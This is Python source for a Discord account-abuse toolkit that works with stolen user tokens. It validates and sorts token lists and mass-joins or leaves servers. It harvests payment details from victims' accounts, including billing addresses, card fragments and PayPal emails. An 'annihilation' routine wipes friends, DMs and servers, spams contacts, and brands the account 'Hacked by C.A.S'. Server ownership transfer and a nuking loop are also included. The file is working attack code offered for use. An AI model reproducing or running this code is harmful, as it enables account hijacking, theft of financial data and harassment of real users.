from requests import get, post, patch, delete
from httpagentparser import detect
from random import randint
from base64 import b64encode
import messages
from json import load, dumps
from time import sleep
from datetime import datetime
from threading import Thread

class TokensTool:
    def __init__(self) -> None:
        """
        Initialization
        """

    def validToken(self,
                   token: str = None, 
                   for_nuker: bool = True, 
                   for_bot: bool = True
        ):
        sessionName = "Token checker"
        errorLog = open("errorlogs.txt", "a+")
        if for_nuker and token:
            headers = {"Authorization": token}
            request = get(
                "https://canary.discord.com/api/v8/users/@me/library", headers=headers
            )
            if request.status_code == 403:
                return "Phone locked."
            elif request.status_code == 401:
                return "Invalid."
            else:
                return "Valid."
        elif for_bot and token:
            headers = {"Authorization": "Bot " + token}
            request = get(
                "https://discord.com/api/v8/users/@me",
                headers=headers,
            )
            if request.status_code == 403:
                return "Locked"
            elif request.status_code == 401:
                return "Invalid."
            else:
                return "Valid."
        else:
            print(messages.exitMenu)
            print(messages.validationMenu)
            try:
                select = str(input("\nSelect: "))
                if select == "1":
                    token = input("\nToken: ")
                    headers = {"Authorization": token}
                    request = get(
                        "https://canary.discord.com/api/v8/users/@me/library",
                        headers=headers,
                    )
                    if for_nuker:
                        if request.status_code == 403:
                            return "Phone locked."
                        elif request.status_code == 401:
                            return "Invalid."
                        else:
                            return "Valid."
                    else:
                        if request.status_code == 403:
                            print(token + " Valid and Phone locked.")
                        elif request.status_code == 401:
                            print(token + " Invalid.")
                        else:
                            print(token + " Valid.")
                elif select == "2":
                    token = str(input("\nBot token: "))
                    headers = {"Authorization": "Bot " + token}
                    request = get(
                        "https://discord.com/api/v8/users/@me",
                        headers=headers,
                    )
                    if request.status_code == 403:
                        print(token + " Locked")
                    elif request.status_code == 401:
                        print(token + " is Invalid.")
                    else:
                        print(token + " is Valid.")
                elif select == "3":
                    validTokens = list()
                    invalidTokens = list()
                    phonelockTokens = list()
                    with open("tokens.txt", "r") as handle:
                        tokens = handle.readlines()
                        for x in tokens:
                            token = x.rstrip()
                            headers = {"Authorization": token}
                            request = get(
                                "https://canary.discord.com/api/v8/users/@me/library",
                                headers=headers,
                            )
                            if request.status_code == 403:
                                print(token + " Valid and Phone locked.")
                                phonelockTokens.append(token)
                            elif request.status_code == 401:
                                print(token + " Invalid.")
                                invalidTokens.append(token)
                            else:
                                print(token + " Valid.")
                                validTokens.append(token)
                    # tokens = open("tokens.txt", "w")
                    # for token in validTokens:
                    #     tokens.write(f"{token}\n")
                    with open("valid_tokens.txt", "a+") as token:
                        for toke in validTokens:
                            token.write(f"{toke}\n")
                    with open("phonelock_tokens.txt", "a+") as token:
                        for toke in phonelockTokens:
                            token.write(f"{toke}\n")
                    with open("invalid_tokens.txt", "a+") as token:
                        for toke in invalidTokens:
                            token.write(f"{toke}\n")
                    print("\nAll tokens filtered.")
                elif select == "4":
                    print(messages.menu)
                    select = str(input("\nSelect: "))
                    if select == "1":
                        print(messages.helpCheckerEN)
                    elif select == "2":
                        print(messages.helpCheckerRU)
                    else:
                        print("\nInvalid option.")
                else:
                    print("\nInvalid option.")
            except KeyboardInterrupt:
                print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def animator(self):
        sessionName = "Animator"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.animatorMenu)
        try:
            select = str(input("\nSelect: "))
            token = input("\nToken: ")
            with open("config.json", "r") as f:
                config = load(f)
            if select == "1":
                serverId = input("\nServer ID: ")
                while True:
                    for name in config["animatedServer"]:
                        sleep(1)
                        req = patch(
                            f"https://discord.com/api/v8/guilds/{serverId}",
                            headers={"Authorization": token},
                            json={"name": name, "icon": None},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "2":
                while True:
                    for statusText in config["animatedStatus"]:
                        sleep(1)
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json={"custom_status": {"text": statusText}},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "3":
                serverId = input("\nServer ID: ")
                while True:
                    for nickname in config["animatedNick"]:
                        sleep(1)
                        req = patch(
                            f"https://discord.com/api/v8/guilds/{serverId}/members/%40me/nick",
                            headers={"Authorization": token},
                            json={"nick": nickname},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "4":
                groupId = input("\nGroup ID: ")
                while True:
                    for groupName in config["animatedGroup"]:
                        sleep(1)
                        req = patch(
                            f"https://discord.com/api/v8/channels/{groupId}",
                            headers={"Authorization": token},
                            json={"name": groupName},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "5":
                channelId = input("\nChannel ID: ")
                while True:
                    for channelName in config["animatedChannel"]:
                        sleep(1)
                        req = patch(
                            f"https://discord.com/api/v8/channels/{channelId}",
                            headers={"Authorization": token},
                            json={"name": channelName},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "6":
                serverId = input("\nServer ID: ")
                userId = input("\nUser ID: ")
                while True:
                    for nickname in config["animatedNick"]:
                        sleep(1)
                        animateNick = {"nick": nickname}
                        req = patch(
                            f"https://discord.com/api/v8/guilds/{serverId}/members/{userId}",
                            headers={"Authorization": token},
                            json=animateNick,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
            elif select == "7":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpAnimatorEN)
                elif select == "2":
                    print(messages.helpAnimatorRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def add(self):
        sessionName = "Manager"
        print(messages.exitMenu)
        print(messages.addMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                file1 = open("tokens.txt", "a")
                while True:
                    token = input("\nToken: ")
                    file1.write(f"{token}\n")
                    print("Token added.")
            elif select == "2":
                file2 = open("webhooks.txt", "a")
                while True:
                    webhook = input("\nWebhook: ")
                    file2.write(f"{webhook}\n")
                    print("Webhook added.")
            elif select == "3":
                file1 = open("tokens.txt", "w")
                file1.close()
            elif select == "4":
                file2 = open("tokens.txt", "w")
                file2.close()
            elif select == "5":
                with open("tokens.txt", "r") as handle:
                    tokens = handle.readlines()
                    for x in tokens:
                        token = x.rstrip()
                        print(token)
            elif select == "6":
                with open("webhooks.txt", "r") as handle:
                    webhooks = handle.readlines()
                    for x in webhooks:
                        webhook = x.rstrip()
                        print(webhook)
            elif select == "7":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpAddEN)
                elif select == "2":
                    print(messages.helpAddRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        input("\nPress key to continue.")

    def leaver(self):
        sessionName = "Leaver"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.leaverMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                token = input("\nToken: ")
                serverID = input("\nServer ID: ")
                req = delete(
                    f"https://discord.com/api/v8/users/@me/guilds/{serverID}",
                    headers={"Authorization": token},
                )
                if req.status_code in messages.statuses:
                    print("Token leaved.")
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
            elif select == "2":
                serverID = input("\nServer ID: ")
                with open("tokens.txt", "r") as handle:
                    tokens = handle.readlines()
                    for x in tokens:
                        token = x.rstrip()
                        req = delete(
                            f"https://discord.com/api/v8/users/@me/guilds/{serverID}",
                            headers={"Authorization": token},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                print("\nAll valid tokens have Leaved!")
            elif select == "3":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpLeaveEN)
                elif select == "2":
                    print(messages.helpLeaveRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def joinToken(self):
        sessionName = "Joiner"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.joinerMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                link = input("\nDiscord Invite: ")
                if len(link) > 6:
                    link = link[19:]
                apilink = f"https://discordapp.com/api/v6/invite/{link}"
                token = input("\nToken: ")
                # req = post(apilink, headers=h, json={})
                req = post(apilink, headers={"Authorization": token})
                if req.status_code in messages.statuses:
                    print("\nToken joined.")
                else:
                    # errorLog.write(
                    #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    # )
                    pass
            elif select == "2":
                link = input("\nDiscord Invite: ")
                if len(link) > 6:
                    link = link[19:]
                apilink = f"https://discordapp.com/api/v6/invite/{link}"
                with open("tokens.txt", "r") as handle:
                    tokens = handle.readlines()
                for x in tokens:
                    token = x.rstrip()
                    req = post(apilink, headers={"Authorization": token})
                    if req.status_code not in messages.statuses:
                        errorLog.write(
                            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                        )
                print("\nAll valid tokens have joined.")
            elif select == "3":
                print(messages.menu)
                select = input("\nSelect: ")
                if select == "1":
                    print(messages.helpJoinerEN)
                elif select == "2":
                    print(messages.helpJoinerRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def cardGrab(self, cc_digits):
        sessionName = "Payments info grab"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.cardMenu)
        grab1 = []
        try:
            select = input("\nSelect: ")
            if select == "1":
                token = input("\nToken: ")
                req = get(
                    "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                    headers={"Authorization": token},
                )
                grabreq = req.json()
                if req.status_code in messages.statuses and grabreq is not list():
                    for grab in grabreq:
                        grab1 = grab["billing_address"]
                        name = grab1["name"]
                        address1 = grab1["line_1"]
                        address2 = grab1["line_2"]
                        city = grab1["city"]
                        postalСode = grab1["postal_code"]
                        state = grab1["state"]
                        country = grab1["country"]
                        if grab["type"] == 1:
                            cc_brand = grab["brand"]
                            cc_first = cc_digits.get(cc_brand)
                            cc_last = grab["last_4"]
                            cc_month = str(grab["expires_month"])
                            cc_year = str(grab["expires_year"])
                            card = f"""
                Payment Type: Credit card
                Valid: {not grab['invalid']}
                CC Holder Name: {name}
                CC Brand: {cc_brand.title()}
                CC Number: {''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last))}
                CC Date: {('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
                Address 1: {address1}
                Address 2: {address2 if address2 else ''}
                City: {city}
                Postal code: {postalСode}
                State: {state if state else ''}
                Country: {country}
                Default Payment Method: {grab['default']}
                            """
                        elif grab["type"] == 2:
                            card = f"""
                Payment Type: PayPal
                Valid: {not grab['invalid']}
                PayPal Name: {name}
                PayPal Email: {grab['email']}
                Address 1: {address1}
                Address 2: {address2 if address2 else ''}
                City: {city}
                Postal code: {postalСode}
                State: {state if state else ''}
                Country: {country}
                Default Payment Method: {grab['default']}
                            """
                        print(card)
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
                    print("No cards in account =(")
            elif select == "2":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpCardGrabEN)
                elif select == "2":
                    print(messages.helpCardGrabRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def m_gl(self, token, setting):
        req = patch(
            "https://discord.com/api/v8/users/@me/settings",
            headers={"Authorization": token},
            json=setting,
        )
        if req.status_code not in messages.statuses:
            # errorLog.write(
            #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
            # )
            print(req.json())
        req = patch(
            "https://discord.com/api/v8/users/@me/settings",
            headers={"Authorization": token},
            json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
        )
        if req.status_code not in messages.statuses:
            # errorLog.write(
            #     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
            # )
            print(req.json())

    def tokenAnnihilation(self, icon, dMdefaultText):
        sessionName = "Annihilation"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.annihilationMenu)
        try:
            select = str(input("\nSelect: "))
            if select == "1":
                token = input("\nToken: ")
                servers = input("\nName of servers: ")
                userText = input("\nMailing text: ")
                headers2 = {"Content-Type": "application/json", "Authorization": token}
                payload = {
                    "name": f"{servers}",
                    "region": "europe",
                    "icon": f"{icon}",
                    "channels": None,
                }
                setting = {
                    "theme": "light",
                    "locale": "zh-CN",
                    "status": "online",
                    "custom_status": {
                        "text": "[ Hacked by C.A.S ]---[ https://t.me/anarcy_squad ]"
                    },
                }
                spredText = f"```{userText}``` {dMdefaultText}"
                spredSMS = {"content": spredText, "tts": False}
                serversId = []
                friendsId = []
                dmId = []
                c = 100
                d = 0
                print("\nStarted annihilation.")
                req = get(
                    "https://discord.com/api/v8/users/@me/guilds",
                    headers={"Authorization": token},
                )
                if req.status_code in messages.statuses:
                    for server in req.json():
                        serversId.append(server["id"])
                    for serversID in serversId:
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json=setting,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = delete(
                            f"https://discord.com/api/v8/users/@me/guilds/{serversID}",
                            headers={"Authorization": token},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json={
                                "theme": "dark",
                                "locale": "zh-TW",
                                "status": "invisible",
                            },
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
                req = get(
                    "https://discord.com/api/v8/users/@me/channels",
                    headers={"Authorization": token},
                )
                if req.status_code in messages.statuses:
                    for dm in req.json():
                        dmId.append(dm["id"])
                    for IDspred in dmId:
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json=setting,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = post(
                            f"https://canary.discord.com/api/v8/channels/{IDspred}/messages",
                            headers={"Authorization": token},
                            json=spredSMS,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json={
                                "theme": "dark",
                                "locale": "zh-TW",
                                "status": "invisible",
                            },
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                    for dmID in dmId:
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json=setting,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = delete(
                            f"https://discord.com/api/v8/channels/{dmID}", headers=headers2
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json={
                                "theme": "dark",
                                "locale": "zh-TW",
                                "status": "invisible",
                            },
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
                req = get(
                    "https://discord.com/api/v8/users/@me/relationships",
                    headers={"Authorization": token},
                )
                if req.status_code in messages.statuses:
                    for friend in req.json():
                        friendsId.append(friend["id"])
                    for friendsID in friendsId:
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json=setting,
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = delete(
                            f"https://discord.com/api/v8/users/@me/relationships/{friendsID}",
                            headers={"Authorization": token},
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                        req = patch(
                            "https://discord.com/api/v8/users/@me/settings",
                            headers={"Authorization": token},
                            json={
                                "theme": "dark",
                                "locale": "zh-TW",
                                "status": "invisible",
                            },
                        )
                        if req.status_code not in messages.statuses:
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
                patch(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": token},
                    json={"avatar": icon},
                )
                patch(
                    "https://discord.com/api/v9/users/@me",
                    headers={"Authorization": token},
                    json={"banner": messages.bannerData},
                )
                while d <= c:
                    req = patch(
                        "https://discord.com/api/v8/users/@me/settings",
                        headers={"Authorization": token},
                        json=setting,
                    )
                    try:
                        if not req.json()["code"] == 40002:
                            if req.status_code not in messages.statuses:
                                print(
                                    f"ERROR. Status code: {req.status_code}. Json: {req.json()}"
                                )
                            req = post(
                                "https://discord.com/api/v8/guilds",
                                headers={"Authorization": token},
                                json=payload,
                            )
                            if req.status_code not in messages.statuses:
                                print(
                                    f"ERROR. Status code: {req.status_code}. Json: {req.json()}"
                                )
                            req = patch(
                                "https://discord.com/api/v8/users/@me/settings",
                                headers={"Authorization": token},
                                json={
                                    "theme": "dark",
                                    "locale": "zh-TW",
                                    "status": "invisible",
                                },
                            )
                            if req.status_code not in messages.statuses:
                                print(
                                    f"ERROR. Status code: {req.status_code}. Json: {req.json()}"
                                )
                            d = d + 1
                        else:
                            print(
                                f"ERROR. This account has phone lock or banned :( . Details: {req.json()['message']}"
                            )
                            input("\nPress key to continue.")
                            break
                    except:
                        continue
                print("\nStarted gliched.")
                while True:
                    for _ in range(10):
                        target = Thread(target=self.m_gl,args=(token,setting,))
                        target.start()

            elif select == "2":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpAnnihilatorEN)
                elif select == "2":
                    print(messages.helpAnnihilatorRU)
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def glitch(self, statusName):
        sessionName = "Glitcher"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.glitchMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                token = input("\nToken: ")
                setting = {
                    "theme": "light",
                    "locale": "zh-CN",
                    "status": "online",
                    "custom_status": {"text": statusName},
                }
                print("\nStarted glitches.")
                while True:
                    req = patch(
                        "https://discord.com/api/v8/users/@me/settings",
                        headers={"Authorization": token},
                        json=setting,
                    )
                    if req.status_code not in messages.statuses:
                        errorLog.write(
                            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                        )
                    req = patch(
                        "https://discord.com/api/v8/users/@me/settings",
                        headers={"Authorization": token},
                        json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
                    )
                    if req.status_code not in messages.statuses:
                        errorLog.write(
                            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                        )
            elif select == "2":
                print(messages.menu)
                select = input("\nSelect: ")
                if select == "1":
                    print(messages.helpGlitchEN)
                elif select == "2":
                    print(messages.helpGlitchRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def ownTrans(self):
        sessionName = "Ownership transpher"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.ovnMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                token = input("\nOvner token: ")
                serverId = input("\nServer ID: ")
                ovnerId = input("\nYour ID: ")
                payload = {"owner_id": ovnerId}
                req = patch(
                    f"https://ptb.discord.com/api/guilds/{serverId}",
                    headers={"Authorization": token},
                    json=payload,
                )
                if req.status_code in messages.statuses:
                    print("\nServer rights transferred.")
                else:
                    print("\nError")
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
            elif select == "2":
                print(messages.menu)
                select = input("\nSelect: ")
                if select == "1":
                    print(messages.helpOvnTransEN)
                elif select == "2":
                    print(messages.helpOvnTransRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def nuker(self):
        token = input("\nToken: ")
        if self.validToken(token, True) == "Valid.":
            while True:
                api = get("https://discordapp.com/api/v6/invite/dP7wGQxrSt")
                data = api.json()
                check = get(
                    "https://discordapp.com/api/v6/guilds/" + data["guild"]["id"],
                    headers={"Authorization": token},
                )
                if check.json()["code"] != 40002:
                    post(
                        "https://discordapp.com/api/v6/invite/dP7wGQxrSt",
                        headers={"Authorization": token},
                    )
                    delete(
                        "https://discordapp.com/api/v6/guilds" + data["guild"]["id"],
                        headers={"Authorization": token},
                    )
                else:
                    print("Account Banned or Phone locked")
                    break
            input("\nPress key to continue.")
        elif self.validToken(token, True) == "Phone locked.":
            print("This token have been phone lock")
            input("\nPress key to continue.")
        else:
            print("This token is invalid =(")
            input("\nPress key to continue.")

